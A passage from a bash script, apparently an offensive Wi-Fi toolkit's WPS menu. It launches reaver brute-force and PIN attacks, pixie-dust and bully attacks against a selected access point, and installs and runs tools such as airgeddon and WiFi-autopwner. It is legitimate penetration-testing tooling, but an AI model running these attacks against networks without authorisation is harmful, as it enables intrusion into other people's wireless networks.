echo -e ""$YS"11"$CE") See latest log"
echo -e ""$YS" 0"$CE") Exit"
echo -e "Choose: "
read -e YN
clear
if [[ "$YN" = "1" ]]
then
	scan_wash
elif [[ "$YN" = "2" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		reaver_attack
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi
elif [[ "$YN" = "3" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		echo -e "Enter your target's WPS pin: "
		read -e WPST
		clear
		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/lscript/wpslog
		echo -e "Press "$YS"enter"$CE" to go back"
		read
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi

elif [[ "$YN" = "4" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		pixie_attack
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi
elif [[ "$YN" = "5" ]]
then
	if [[ "$ESSIDT" != "" ]]
	then
		pixie_loop
	else
		echo -e ""$RS"No network selected"$CE""
		sleep 2
	fi
elif [[ "$YN" = "6" ]]
then
	if [[ -f /usr/bin/bully ]]
	then
		if [[ "$ESSIDT" != "" ]]
		then
			bully_script
		else
			echo -e ""$RS"No network selected"$CE""
			sleep 2
		fi
	else
		echo -e ""$RS"Bully isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_bully
			start2_menu
		fi
	fi
elif [[ "$YN" = "7" ]]
then
	if [[ -f /root/bully/src/bully.py ]]
	then
		cd /root/bully/src
		./bully.py
		cd
	else
		echo -e ""$RS"Bully isn't installed.Type '"$CE""$YS"install"$CE""$RS"'to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_bully
			start2_menu
		fi
	fi
elif [[ "$YN" = "8" ]]
then
	if [[ -f /root/WiFi-autopwner/wifi-autopwner.sh ]]
	then
		cd /root/WiFi-autopwner
		./wifi-autopwner.sh
		cd
	else
		echo -e ""$RS"Wifi autopwner isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_wifiautopwner
			start2_menu
		fi
	fi
elif [[ "$YN" = "9" ]]
then
	if [[ -d "/root/airgeddon" ]]
	then
		cd /root/airgeddon
		./airgeddon.sh
		cd
	else
		echo -e ""$RS"Airgeddon isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_airgeddon
			start2_menu
		fi
	fi
elif [[ "$YN" = "10" ]]
then
	if [[ -d "/root/VMR" ]]
	then
		cd /root/VMR
		./VMR-MDK-K2-2017R-012x2.sh
	else
		echo -e ""$RS"VMR isn't installed.Type '"$CE""$YS"install"$CE""$RS"' to stop monitor mode and install it."$CE""
		read INSTALL
		if [[ "$INSTALL" = "install" ]]
		then
			stop2_menu
			echo -e "Press "$YS"enter"$CE" when connected to a network"
			read ENT
			install_vmr
			start2_menu
		fi
	fi
elif [[ "$YN" = "11" ]]
then
	cat /root/lscript/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read
elif [[ "$YN" = "0" ]]
then
	exit
fi
done
}

####################################
defaults_lh3
main_wps_options
